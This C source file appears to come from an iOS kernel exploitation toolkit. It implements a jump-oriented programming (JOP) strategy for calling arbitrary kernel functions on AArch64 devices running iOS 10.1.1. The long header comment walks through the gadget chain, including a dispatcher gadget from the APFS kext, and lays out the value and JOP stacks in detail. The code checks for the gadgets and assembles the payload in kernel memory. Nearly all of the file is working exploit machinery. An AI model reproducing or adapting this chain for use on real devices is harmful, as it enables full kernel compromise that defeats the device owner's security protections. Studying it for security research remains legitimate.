/*
 * AArch64 Kernel Function Call Strategy 1
 * ---------------------------------------
 *
 *  The JOP payload is set up by writing the JOP stack (called JOP_STACK) and the value stack
 *  (called VALUE_STACK) into kernel memory. Then kernel_call_7 is used to initialize registers and
 *  jump to the first gadget, which sets up the necessary context to start executing from
 *  JOP_STACK.
 *
 *  The most important JOP gadget is the dispatcher. For this JOP program, I am using this
 *  incredibly useful gadget from com.apple.filesystems.apfs:
 *
 *  	ldp     x2, x1, [x1]
 *  	br      x2
 *
 *  This gadget loads x2 and x1 with the 2 64-bit words at the address in x1, then jumps to x2.
 *  Since the load overwrites the dereferenced register x1, we can implement our JOP stack as a
 *  linked list, where the first pointer in each node is the gadget to execute and the second
 *  pointer is the address of the next node. We can chain the execution of the gadgets as long as
 *  each gadget jumps back to the dispatcher.
 *
 *  The listing below is a complete description of the code executed in the kernel to perform the
 *  function call, starting from kernel_call_7.
 *
 *  -----------------------------------------------------------------------------------------------
 *
 *  kernel_call_7
 *  	x0 = VALUE_STACK
 *  	x1 = JOP_STACK
 *  	x2 = MOV_X8_X4__BR_X5
 *  	x3 = MOV_X2_X30__BR_X12
 *  	x4 = JOP_DISPATCH = LDP_X2_X1_X1__BR_X2
 *  	x5 = MOV_X21_X2__BR_X8
 *  	pc = MOV_X12_X2__BR_X3
 *
 *  mov x12, x2 ; br x3
 *  	x12 = MOV_X8_X4__BR_X5
 *  	pc = MOV_X2_X30__BR_X12
 *
 *  mov x2, x30 ; br x12
 *  	x2 = RETURN_ADDRESS
 *  	pc = MOV_X8_X4__BR_X5
 *
 *  mov x8, x4 ; br x5
 *  	x8 = JOP_DISPATCH
 *  	pc = MOV_X21_X2__BR_X8
 *
 *  mov x21, x2 ; br x8
 *  	x21 = RETURN_ADDRESS
 *  	pc = JOP_DISPATCH
 *
 *  ldp x2, x1, [x1] ; br x2
 *  	pc = MOV_X20_X0__BLR_X8
 *
 *  mov x20, x0 ; blr x8
 *  	x20 = VALUE_STACK
 *  	pc = JOP_DISPATCH
 *  	pc = MOV_X10_X4__BR_X8
 *
 *  mov x10, x4 ; br x8
 *  	x10 = JOP_DISPATCH
 *  	pc = JOP_DISPATCH
 *  	pc = MOV_X9_X10__BR_X8
 *
 *  mov x9, x10 ; br x8
 *  	x9 = JOP_DISPATCH
 *  	pc = JOP_DISPATCH
 *  	pc = MOV_X11_X9__BR_X8
 *
 *  mov x11, x9 ; br x8
 *  	x11 = JOP_DISPATCH
 *  	pc = JOP_DISPATCH
 *  	pc = LDP_X3_X4_X20_20__LDP_X5_X6_X20_30__BLR_X8
 *
 *  ldp x3, x4, [x20, #0x20] ; ldp x5, x6, [x20, #0x30] ; blr x8
 *  	x3 = VALUE_STACK[20] = LDP_X8_X1_X20_10__BLR_X8
 *  	x4 = VALUE_STACK[28] = MOV_X30_X28__BR_X12
 *  	x5 = VALUE_STACK[30]
 *  	x6 = VALUE_STACK[38] = STORE_RESUME
 *  	pc = JOP_DISPATCH
 *  	pc = ADD_X20_X20_34__BR_X8
 *
 *  add x20, x20, #0x34 ; br x8
 *  	x20 += 0x34
 *  	pc = JOP_DISPATCH
 *  	pc = MOV_X22_X6__BLR_X8
 *
 *  mov x22, x6 ; blr x8
 *  	x22 = STORE_RESUME
 *  	pc = JOP_DISPATCH
 *  	pc = MOV_X24_X4__BR_X8
 *
 *  mov x24, x4 ; br x8
 *  	x24 = MOV_X30_X28__BR_X12
 *  	pc = JOP_DISPATCH
 *  	pc = MOV_X0_X3__BLR_X8
 *
 *  mov x0, x3 ; blr x8
 *  	x0 = LDP_X8_X1_X20_10__BLR_X8
 *  	pc = JOP_DISPATCH
 *  	pc = MOV_X28_X0__BLR_X8
 *
 *  mov x28, x0 ; blr x8
 *  	x28 = LDP_X8_X1_X20_10__BLR_X8
 *  	pc = JOP_DISPATCH
 *  	pc = LDP_X3_X4_X20_20__LDP_X5_X6_X20_30__BLR_X8
 *
 *  ldp x3, x4, [x20, #0x20] ; ldp x5, x6, [x20, #0x30] ; blr x8
 *  	x3 = VALUE_STACK[54] = <func>
 *  	x4 = VALUE_STACK[5c]
 *  	x5 = VALUE_STACK[64] = <arg7>
 *  	x6 = VALUE_STACK[6c]
 *  	pc = JOP_DISPATCH
 *  	pc = ADD_X20_X20_34__BR_X8
 *
 *  add x20, x20, #0x34 ; br x8
 *  	x20 += 0x34
 *  	pc = JOP_DISPATCH
 *  	pc = MOV_X12_X3__BR_X8
 *
 *  mov x12, x3 ; br x8
 *  	x12 = <func>
 *  	pc = JOP_DISPATCH
 *  	pc = MOV_X0_X5__BLR_X8
 *
 *  mov x0, x5 ; blr x8
 *  	x0 = <arg7>
 *  	pc = JOP_DISPATCH
 *  	pc = MOV_X9_X0__BR_X11
 *
 *  mov x9, x0 ; br x11
 *  	x9 = <arg7>
 *  	pc = JOP_DISPATCH
 *  	pc = MOV_X7_X9__BLR_X11
 *
 *  mov x7, x9 ; blr x11
 *  	x7 = <arg7>
 *  	pc = JOP_DISPATCH
 *  	pc = LDP_X3_X4_X20_20__LDP_X5_X6_X20_30__BLR_X8
 *
 *  ldp x3, x4, [x20, #0x20] ; ldp x5, x6, [x20, #0x30] ; blr x8
 *  	x3 = VALUE_STACK[88] = <arg1>
 *  	x4 = VALUE_STACK[90] = <arg2>
 *  	x5 = VALUE_STACK[98] = <arg0>
 *  	x6 = VALUE_STACK[a0]
 *  	pc = JOP_DISPATCH
 *  	pc = ADD_X20_X20_34__BR_X8
 *
 *  add x20, x20, #0x34 ; br x8
 *  	x20 += 0x34
 *  	pc = JOP_DISPATCH
 *  	pc = MOV_X0_X3__BLR_X8
 *
 *  mov x0, x3 ; blr x8
 *  	x0 = <arg1>
 *  	pc = JOP_DISPATCH
 *  	pc = MOV_X9_X0__BR_X11
 *
 *  mov x9, x0 ; br x11
 *  	x9 = <arg1>
 *  	pc = JOP_DISPATCH
 *  	pc = MOV_X10_X4__BR_X8
 *
 *  mov x10, x4 ; br x8
 *  	x10 = <arg2>
 *  	pc = JOP_DISPATCH
 *  	pc = MOV_X0_X5__BLR_X8
 *
 *  mov x0, x5 ; blr x8
 *  	x0 = <arg0>
 *  	pc = JOP_DISPATCH
 *  	pc = LDP_X3_X4_X20_20__LDP_X5_X6_X20_30__BLR_X8
 *
 *  ldp x3, x4, [x20, #0x20] ; ldp x5, x6, [x20, #0x30] ; blr x8
 *  	x3 = VALUE_STACK[bc] = <arg3>
 *  	x4 = VALUE_STACK[c4] = <arg4>
 *  	x5 = VALUE_STACK[cc] = <arg5>
 *  	x6 = VALUE_STACK[d4] = <arg6>
 *  	pc = JOP_DISPATCH
 *  	pc = MOV_X11_X24__BR_X8
 *
 *  mov x11, x24 ; br x8
 *  	x11 = MOV_X30_X28__BR_X12
 *  	pc = JOP_DISPATCH
 *  	pc = MOV_X1_X9__MOV_X2_X10__BLR_X11
 *
 *  mov x1, x9 ; mov x2, x10 ; blr x11
 *  	x1 = <arg1>
 *  	x2 = <arg2>
 *  	pc = MOV_X30_X28__BR_X12
 *
 *  mov x30, x28 ; br x12
 *  	x30 = LDP_X8_X1_X20_10__BLR_X8
 *  	pc = <func>
 *  	x0 = <result>
 *  	pc = LDP_X8_X1_X20_10__BLR_X8
 *
 *  ldp x8, x1, [x20, #0x10] ; blr x8
 *  	x8 = VALUE_STACK[ac] = JOP_DISPATCH
 *  	x1 = VALUE_STACK[b4] = JOP_STACK
 *  	pc = JOP_DISPATCH
 *  	pc = STR_X0_X20__LDR_X8_X22__LDR_X8_X8_28__MOV_X0_X22__BLR_X8
 *
 *  str x0, [x20] ; ldr x8, [x22] ; ldr x8, [x8, #0x28] ; mov x0, x22 ; blr x8
 *  	VALUE_STACK[9c] = <result>
 *  	x8 = STORE_RESUME[0] = STORE_RESUME+8-28
 *  	x8 = (STORE_RESUME+8-28)[28] = JOP_DISPATCH
 *  	x0 = STORE_RESUME
 *  	pc = JOP_DISPATCH
 *  	pc = MOV_X30_X21__BR_X8
 *
 *  mov x30, x21 ; br x8
 *  	x30 = RETURN_ADDRESS
 *  	pc = JOP_DISPATCH
 *  	pc = RET
 *
 *  ret
 *  	pc = RETURN_ADDRESS
 *
 *  -----------------------------------------------------------------------------------------------
 *
 *  Because the JOP_STACK is constant (only the data loaded from VALUE_STACK changes), it is
 *  possible to set up the JOP payload in kernel memory during initialization, then overwrite the
 *  function and arguments in the value stack as necessary. However, at least initially, we will
 *  overwrite the full JOP payload on each function call.
 *
 *  The JOP payload is laid out as follows:
 *
 *  	jop_payload      100              200              300              400
 *  	+----------------+----------------+----------------+----------------+
 *  	|~~~~~~~~~~~~~~  :                :                :                | VALUE_STACK
 *  	|~               :                :                :                | STORE_RESUME
 *  	|              ~~:~~~~~~~~~~~~~~~~:~~~~~~~~~~~~~~~~:~~~~~~~~~~~~~~~~| JOP_STACK
 *  	+----------------+----------------+----------------+----------------+
 *
 *  VALUE_STACK is the stack of values that will be loaded into registers using the load gadget.
 *  The JOP payload calls the load gadget 4 times and advances the VALUE_STACK register by 0x34
 *  after each of the first 3 loads. Then, after the function call, the VALUE_STACK is read for
 *  function call recovery and written to to store the result. The overall layout of the
 *  VALUE_STACK is:
 *
 *  	VALUE_STACK         10                  20                  30   34             40
 *  	+---------+---------+---------+---------+---------+---------+----+----+---------+
 *  	| ~ STORE_RESUME ~~ |         |         | LDP_X8_ | MOV_X30 | _______ | STORE_R |  >---+
 *  	+---------+---------+---------+---------+---------+---------+----+----+---------+      |
 *  	                                                                                       |
 *  	   +-----------------------------------------------------------------------------------+
 *  	   |
 *  	   V
 *  	34             40   44                  54                  64   68             74
 *  	+----+---------+----+---------+---------+---------+---------+----+----+---------+
 *  	____ | STORE_R |    :         :         : <func>  : _______ : <arg7>  : _______ :  >---+
 *  	+----+---------+----+---------+---------+---------+---------+----+----+---------+      |
 *  	                                                                                       |
 *  	   +-----------------------------------------------------------------------------------+
 *  	   |
 *  	   V
 *  	68             74   78                  88                  98   9c             a8
 *  	+----+---------+----+---------+---------+---------+---------+----+----+---------+
 *  	g7>  : _______ :    |         |         | <arg1>  | <arg2>  | <arg0>  | _______ |  >---+
 *  	+----+---------+----+---------+---------+---------+---------+----+----+---------+      |
 *  	                                                                                       |
 *  	   +-----------------------------------------------------------------------------------+
 *  	   |
 *  	   V
 *  	9c             a8   ac                  bc                  cc   d0             dc
 *  	+----+---------+----+---------+---------+---------+---------+----+----+---------+
 *  	g0>  | _______ |    : JOP_DIS : JOP_STA : <arg3>  : <arg4>  : <arg5>  : <arg6>  :
 *  	+----+---------+----+---------+---------+---------+---------+----+----+---------+
 *  	^^^^^^^^^^^
 *  	| <result |
 *  	+---------+
 *
 *  Thus, the part of the JOP payload that varies is VALUE_STACK+0x54 to VALUE_STACK+0xdc, and the
 *  result can be read from VALUE_STACK+0x9c.
 *
 *  STORE_RESUME is used to resume execution of the JOP_STACK after the store gadget:
 *
 *  	str     x0, [x20]
 *  	ldr     x8, [x22]
 *  	ldr     x8, [x8, #0x28]
 *  	mov     x0, x22
 *  	blr     x8
 *
 *  To continue executing the JOP_STACK, x8 must be JOP_DISPATCH at the branch point. Thus, we can
 *  use the following layout:
 *
 *  	STORE_RESUME            8                       10
 *  	+-----------------------+-----------------------+
 *  	| STORE_RESUME+0x8-0x28 |     JOP_DISPATCH      |
 *  	+-----------------------+-----------------------+
 *
 *  Finally, the JOP_STACK is effectively a linked list of gadget pointers. The dispatch gadget is:
 *
 *  	ldp     x2, x1, [x1]
 *  	br      x2
 *
 *  Thus we may organize the JOP_STACK as:
 *
 *  	JOP_STACK  8          10         18         20         28         30         38
 *  	+----------+----------+----------+----------+----------+----------+----------+
 *  	| gadget 0 |   +10    | gadget 1 |   +20    | gadget 2 |   +30    | gadget 3 | ...
 *  	+----------+----------+----------+----------+----------+----------+----------+
 *
 *  The one tricky point is recovering from the function call. Once x1 is overwritten with arg1,
 *  the rest of that JOP_STACK is lost. The call recovery gadget restores the JOP_STACK using the
 *  VALUE_STACK:
 *
 *  	ldp     x8, x1, [x20, #0x10]
 *  	blr     x8
 *
 *  Thus, the corresponding element of VALUE_STACK must point to the rest of the JOP_STACK.
 *
 *  Note that the preceding organization for the JOP payload is not very space efficient: there are
 *  lots of gaps that could be packed to make the JOP payload take less space. However, because we
 *  are allocating memory with mach_vm_allocate which returns a whole number of memory pages, we
 *  cannot save any memory by packing the payload densely.
 */

#include "aarch64/jop/call_strategy.h"
#include "aarch64/jop/gadgets_static.h"

static bool
check() {
#define NEED(gadget)					\
	if (static_gadgets[gadget].address == 0) {	\
		return false;				\
	}
	NEED(LDP_X2_X1_X1__BR_X2);
	NEED(MOV_X12_X2__BR_X3);
	NEED(MOV_X2_X30__BR_X12);
	NEED(MOV_X8_X4__BR_X5);
	NEED(MOV_X21_X2__BR_X8);
	NEED(MOV_X20_X0__BLR_X8);
	NEED(MOV_X10_X4__BR_X8);
	NEED(MOV_X9_X10__BR_X8);
	NEED(MOV_X11_X9__BR_X8);
	NEED(LDP_X3_X4_X20_20__LDP_X5_X6_X20_30__BLR_X8);
	NEED(ADD_X20_X20_34__BR_X8);
	NEED(MOV_X22_X6__BLR_X8);
	NEED(MOV_X24_X4__BR_X8);
	NEED(MOV_X0_X3__BLR_X8);
	NEED(MOV_X28_X0__BLR_X8);
	NEED(MOV_X12_X3__BR_X8);
	NEED(MOV_X0_X5__BLR_X8);
	NEED(MOV_X9_X0__BR_X11);
	NEED(MOV_X7_X9__BLR_X11);
	NEED(MOV_X11_X24__BR_X8);
	NEED(MOV_X1_X9__MOV_X2_X10__BLR_X11);
	NEED(MOV_X30_X28__BR_X12);
	NEED(LDP_X8_X1_X20_10__BLR_X8);
	NEED(STR_X0_X20__LDR_X8_X22__LDR_X8_X8_28__MOV_X0_X22__BLR_X8);
	NEED(MOV_X30_X21__BR_X8);
	NEED(RET);
	return true;
#undef NEED
}

static void
build(uint64_t func, const uint64_t args[8], kaddr_t kernel_payload,
		void *payload0, struct jop_call_initial_state *initial_state,
		uint64_t *result_address) {
	const size_t VALUE_STACK_OFFSET  = 0;
	const size_t RESULT_OFFSET       = 0x9c;
	const size_t STORE_RESUME_OFFSET = 0;
	const size_t JOP_STACK_OFFSET    = 0xe0;
	const size_t LOAD_ADVANCE        = 0x34;
	const int    STORE_RESUME_DELTA  = -0x28;

	uint8_t *const payload = (uint8_t *)payload0;
	// Set up STORE_RESUME.
	uint64_t store_resume = kernel_payload + STORE_RESUME_OFFSET;
	uint64_t *store_resume_payload = (uint64_t *)(payload + STORE_RESUME_OFFSET);
	store_resume_payload[0] = store_resume + sizeof(uint64_t) + STORE_RESUME_DELTA;
	store_resume_payload[1] = static_gadgets[LDP_X2_X1_X1__BR_X2].address;
	// Set up JOP_STACK.
	const unsigned jop_call_chain_gadgets[] = {
		MOV_X20_X0__BLR_X8,
		MOV_X10_X4__BR_X8,
		MOV_X9_X10__BR_X8,
		MOV_X11_X9__BR_X8,
		LDP_X3_X4_X20_20__LDP_X5_X6_X20_30__BLR_X8,
		ADD_X20_X20_34__BR_X8,
		MOV_X22_X6__BLR_X8,
		MOV_X24_X4__BR_X8,
		MOV_X0_X3__BLR_X8,
		MOV_X28_X0__BLR_X8,
		LDP_X3_X4_X20_20__LDP_X5_X6_X20_30__BLR_X8,
		ADD_X20_X20_34__BR_X8,
		MOV_X12_X3__BR_X8,
		MOV_X0_X5__BLR_X8,
		MOV_X9_X0__BR_X11,
		MOV_X7_X9__BLR_X11,
		LDP_X3_X4_X20_20__LDP_X5_X6_X20_30__BLR_X8,
		ADD_X20_X20_34__BR_X8,
		MOV_X0_X3__BLR_X8,
		MOV_X9_X0__BR_X11,
		MOV_X10_X4__BR_X8,
		MOV_X0_X5__BLR_X8,
		LDP_X3_X4_X20_20__LDP_X5_X6_X20_30__BLR_X8,
		MOV_X11_X24__BR_X8,
		MOV_X1_X9__MOV_X2_X10__BLR_X11,
	};
	const unsigned jop_return_chain_gadgets[] = {
		STR_X0_X20__LDR_X8_X22__LDR_X8_X8_28__MOV_X0_X22__BLR_X8,
		MOV_X30_X21__BR_X8,
		RET,
	};
	struct dispatch_gadget {
		uint64_t x2;
		uint64_t x1;
	} *dispatch_gadget = (struct dispatch_gadget *)(payload + JOP_STACK_OFFSET);
	uint64_t jop_chain_next = kernel_payload + JOP_STACK_OFFSET;
	for (size_t i = 0; i < ARRSIZE(jop_call_chain_gadgets); i++) {
		jop_chain_next += sizeof(*dispatch_gadget);
		dispatch_gadget->x2 = static_gadgets[jop_call_chain_gadgets[i]].address;
		dispatch_gadget->x1 = jop_chain_next;
		dispatch_gadget++;
	}
	uint64_t jop_return_chain = jop_chain_next;
	for (size_t i = 0; i < ARRSIZE(jop_return_chain_gadgets); i++) {
		jop_chain_next += sizeof(*dispatch_gadget);
		dispatch_gadget->x2 = static_gadgets[jop_return_chain_gadgets[i]].address;
		dispatch_gadget->x1 = jop_chain_next;
		dispatch_gadget++;
	}
	// Set up VALUE_STACK.
	struct load_gadget {
		uint64_t pad[4];
		uint64_t x3;
		uint64_t x4;
		uint64_t x5;
		uint64_t x6;
	} *load_gadget = (struct load_gadget *)(payload + VALUE_STACK_OFFSET);
	load_gadget->x3 = static_gadgets[LDP_X8_X1_X20_10__BLR_X8].address;
	load_gadget->x4 = static_gadgets[MOV_X30_X28__BR_X12].address;
	load_gadget->x6 = store_resume;
	load_gadget = (struct load_gadget *)((uint8_t *)load_gadget + LOAD_ADVANCE);
	load_gadget->x3 = func;
	load_gadget->x5 = args[7];
	load_gadget = (struct load_gadget *)((uint8_t *)load_gadget + LOAD_ADVANCE);
	load_gadget->x3 = args[1];
	load_gadget->x4 = args[2];
	load_gadget->x5 = args[0];
	load_gadget = (struct load_gadget *)((uint8_t *)load_gadget + LOAD_ADVANCE);
	load_gadget->x3 = args[3];
	load_gadget->x4 = args[4];
	load_gadget->x5 = args[5];
	load_gadget->x6 = args[6];
	struct call_recover_gadget {
		uint64_t pad[2];
		uint64_t x8;
		uint64_t x1;
	} *call_recover_gadget = (struct call_recover_gadget *)((uint8_t *)load_gadget);
	call_recover_gadget->x8 = static_gadgets[LDP_X2_X1_X1__BR_X2].address;
	call_recover_gadget->x1 = jop_return_chain;
	// Declare the initial state.
	initial_state->pc = static_gadgets[MOV_X12_X2__BR_X3].address;
	initial_state->x[0] = kernel_payload + VALUE_STACK_OFFSET;
	initial_state->x[1] = kernel_payload + JOP_STACK_OFFSET;
	initial_state->x[2] = static_gadgets[MOV_X8_X4__BR_X5].address;
	initial_state->x[3] = static_gadgets[MOV_X2_X30__BR_X12].address;
	initial_state->x[4] = static_gadgets[LDP_X2_X1_X1__BR_X2].address;
	initial_state->x[5] = static_gadgets[MOV_X21_X2__BR_X8].address;
	// Specify the result address.
	*result_address = kernel_payload + RESULT_OFFSET;
}

/*
 * jop_call_strategy_1
 *
 * Description:
 * 	The JOP payload described at the top of this file.
 *
 * Platforms:
 * 	iOS 10.1.1 14B100: n71, d10
 */
struct jop_call_strategy jop_call_strategy_1 = {
	0x400, 0, check, build,
};
